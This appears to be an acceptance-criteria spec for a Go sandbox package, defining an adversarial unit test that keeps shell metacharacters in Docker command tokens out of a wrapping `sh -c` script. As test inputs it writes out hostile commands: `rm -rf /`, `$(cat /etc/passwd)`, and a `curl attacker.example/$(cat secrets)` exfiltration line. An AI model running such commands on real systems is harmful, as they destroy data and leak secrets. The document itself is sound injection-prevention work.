# Acceptance Criteria: No-Interpolation Injection-Safety Invariant

**Related User Story:** [03: Ephemeral-Copy Setup Injection](../user-stories/03-ephemeral-copy-setup-injection.md)

## Implementation Technology
| Component | Technology | Notes |
|-----------|------------|-------|
| Component Type | Go argv construction — adversarial security invariant test | `internal/sandbox/docker.go:145-147` (Command-mode wrap from AC 03-01) |
| Test Framework | `go test` + `testify` (`assert`/`require`) | Adversarial-input unit test, no daemon required |
| Key Dependencies | none (stdlib only) | Property is structural (positional `-- "$@"` expansion vs string interpolation), verifiable from argv alone |

## Related Files
- `internal/sandbox/docker.go` - reference/verify (implemented by AC 03-01, not re-implemented here): the Command-mode wrap must use `/bin/sh -c '<fixed script text>' -- <spec.Command elements>`, where `<fixed script text>` is a Go string literal (`"cp -a /src/. /work/ && cd /work && exec \"$@\""`) containing zero data from `spec.Command`, and `spec.Command`'s elements are appended as distinct trailing `[]string` argv entries after `--`
- `internal/sandbox/sandbox_test.go` - modify: add `TestDockerRunArgs_CommandModeWritable_NoShellInjection` (or equivalent) that feeds `spec.Command` tokens containing shell metacharacters (`;`, `` ` ``, `$(...)`) and asserts they survive as literal, unexecuted argv elements rather than being concatenated into the `-c` script string
- `internal/sandbox/sandbox.go` - reference only (not modified): `RunSpec.Command`'s doc comment (`sandbox.go:29-30`, "No shell interpolation is performed") is the pre-existing invariant this AC extends to the `Writable:true` wrapped path

### Related Files (from codebase-discovery.json)
- `internal/sandbox/docker.go:145-147` (`dockerRunArgs` Command-mode branch) — reference/verify (implemented by AC 03-01, not re-implemented here): the structural source of the invariant this AC tests
- `internal/sandbox/docker.go:153-158` (`renderCommand`) — reference-only: joins `spec.Command` with `strings.Join` into a display-only evidence string that is never executed, so its joining is not an injection vector; do not "fix" it by routing it into execution
- `internal/sandbox/sandbox.go:28-35` (`RunSpec.Command`/`Script` doc comments) — reference-only: "No shell interpolation is performed" (`sandbox.go:30`) and "never interpolated into argv" (`sandbox.go:33`) are the pre-existing invariants extended to the wrapped path
- `internal/sandbox/sandbox_test.go` — extend: new adversarial `TestDockerRunArgs_CommandModeWritable_NoShellInjection` (or equivalent), following the package's daemon-free argv-level assertion pattern
- `internal/verify/sandboxvalidate_test.go:71` — reference-only: `--auto-fix`'s Command-mode-only invariant; the adversarial inputs that matter most are operator/model-configured `validate_command` argv tokens flowing through this path

Reference documentation: [Docker tmpfs and read-only mounts](../documentation/docker-tmpfs-and-read-only-mounts.md), [Current sandbox guarantees](../documentation/current-sandbox-guarantees.md).

## Happy Path Scenarios
**Scenario 1: A benign multi-token command passes through the wrap unmodified**
- **Given** `RunSpec{Command: []string{"npm", "run", "build"}, SnapshotDir: "/tmp/snap", Writable: true}`
- **When** `dockerRunArgs` builds the wrapped argv
- **Then** `npm`, `run`, and `build` each appear as separate argv elements after `--`, and the `-c` script argv element is exactly the fixed literal `cp -a /src/. /work/ && cd /work && exec "$@"` with no trace of `npm run build` inside it

## Edge Cases
**Edge Case 1: A command token containing a semicolon is not treated as a command separator**
- **Given** `RunSpec{Command: []string{"echo", "hi; rm -rf /"}, SnapshotDir: "/tmp/snap", Writable: true}`
- **When** `dockerRunArgs` builds the wrapped argv
- **Then** `"hi; rm -rf /"` appears as a single literal argv element after `--` (via `$@` positional expansion, `sh` never re-parses it as two commands) — the `-c` script string itself does not contain `hi; rm -rf /` anywhere, so there is no string-interpolation path through which the semicolon could be re-tokenized by the wrapping shell

**Edge Case 2: A command token containing a command-substitution payload is not evaluated**
- **Given** `RunSpec{Command: []string{"echo", "$(cat /etc/passwd)"}, SnapshotDir: "/tmp/snap", Writable: true}`
- **When** `dockerRunArgs` builds the wrapped argv
- **Then** `"$(cat /etc/passwd)"` appears as a single literal argv element after `--`, never substituted into the `-c` script text where a shell would evaluate it; the same property holds for a backtick-delimited payload (e.g. `` `whoami` ``)

**Edge Case 3: Writable:false path has no wrap and therefore no `-c` string to protect**
- **Given** the same adversarial commands from Edge Cases 1-2 with `Writable: false` (or omitted)
- **When** `dockerRunArgs` builds argv
- **Then** the command tokens are appended directly as `spec.Command...` (today's unwrapped shape, per AC 03-01 Scenario 2) — there is no shell in the loop at all, so the injection question is moot for this path, and this must remain true after this AC's changes land

**Edge Case 4: Empty, whitespace-only, and newline-containing tokens survive positionally**
- **Given** `RunSpec{Command: []string{"printf", "", "a b", "line1\nline2"}, SnapshotDir: "/tmp/snap", Writable: true}`
- **When** `dockerRunArgs` builds the wrapped argv
- **Then** all four tokens appear after `--` as exactly four distinct argv elements — the empty string is a present, empty argv element (not dropped or filtered), and no token is split on its embedded whitespace or newline; `$@` positional expansion preserves each element as a single literal argument, and the `-c` script element remains exactly the fixed literal

## Error Conditions
**Error Scenario 1: N/A — this AC is a safety-property test, not a new error path**
- No new validation or error return is introduced. The invariant is enforced structurally by construction (fixed literal `-c` text + positional `-- "$@"` expansion), not by rejecting dangerous input — dangerous-looking tokens are legitimate operator/model-configured command arguments and must still execute as literal arguments, just never as shell syntax.
- Error message: no new error message is introduced by this AC.
- HTTP status / error code: not applicable (internal Go package, no HTTP surface).

## Performance Requirements
- **Response Time:** No measurable change — this AC adds test coverage only; the underlying wrap logic (AC 03-01) is already a fixed-size argv construction with no adversarial-input-dependent branching.
- **Throughput:** Not applicable — no runtime behavior changes, only verification of an existing structural property.

## Security Considerations
- **Authentication/Authorization:** Not applicable — internal Go package, no external auth surface.
- **Input Validation:** This AC IS the security control. `spec.Command` can carry arbitrary operator- or model-influenced strings (per the story's Constraints and Potential Risks sections); the only safe way to run them under a shell wrapper is positional expansion (`-- "$@"`) so the shell treats each element as a literal argument rather than script text. Adversarial scenario: a finding-remediation command constructed as `["sh", "-c", "test; curl attacker.example/$(cat secrets)"]` must, under `Writable:true`, have that entire string arrive as a single literal `argv[N]` element passed to the *inner* `sh -c` invocation the operator's own command specifies (which is `spec.Command`'s business, unrelated to this wrap) — never get re-interpreted or double-evaluated by the *outer* wrapping shell this story introduces. If the outer wrap instead built its `-c` string via `fmt.Sprintf("cp -a /src/. /work/ && cd /work && exec %s", strings.Join(spec.Command, " "))` or similar concatenation, the semicolon/backtick/`$()` in the adversarial example would be interpreted by the outer shell, reopening exactly the shell-injection class `RunSpec.Command`'s "No shell interpolation is performed" doc comment (`sandbox.go:30`) was designed to close. This AC's tests must fail loudly if that regression is ever introduced.

## Test Implementation Guidance
**Test Type:** UNIT (adversarial/security-focused)
**Test Data Requirements:** `spec.Command` slices containing shell metacharacters as literal Go string elements: `;`, `` `cmd` ``, `$(cmd)`, and a combined payload. No fixtures or filesystem needed.
**Mock/Stub Requirements:** None — `dockerRunArgs` is pure/I-O-free; assertions operate on the returned `[]string` argv directly (checking both `strings.Join` substring absence for the raw payload inside the `-c` element specifically, and exact positional presence as a standalone trailing argv element).

## Definition of Done
**Auto-Verified:**
- [x] All tests passing (`go test ./internal/sandbox/...`)
- [x] No linting errors (`go vet ./...` / project lint gate)
- [x] Build succeeds (`go build ./...`)

**Story-Specific:**
- [x] A command token containing `;` survives as a single literal trailing argv element, never split or interpreted as a command separator by the wrapping shell
- [x] A command token containing `$(...)` or backticks survives as a single literal trailing argv element, never evaluated by the wrapping shell
- [x] The `-c` script argv element is asserted, for every adversarial case, to be exactly the fixed literal `cp -a /src/. /work/ && cd /work && exec "$@"` with no trace of the adversarial payload concatenated into it
- [x] The `Writable:false` path (no wrap, no shell) is reconfirmed unaffected for the same adversarial inputs
- [x] No `fmt.Sprintf`, `strings.Join`, or other string interpolation of `spec.Command` data appears anywhere in the wrap construction path — the `-c` text is a fixed Go string literal (grep-verifiable in the implementation diff, in addition to the runtime argv assertions above)

**Manual Review:**
- [ ] Code reviewed and approved
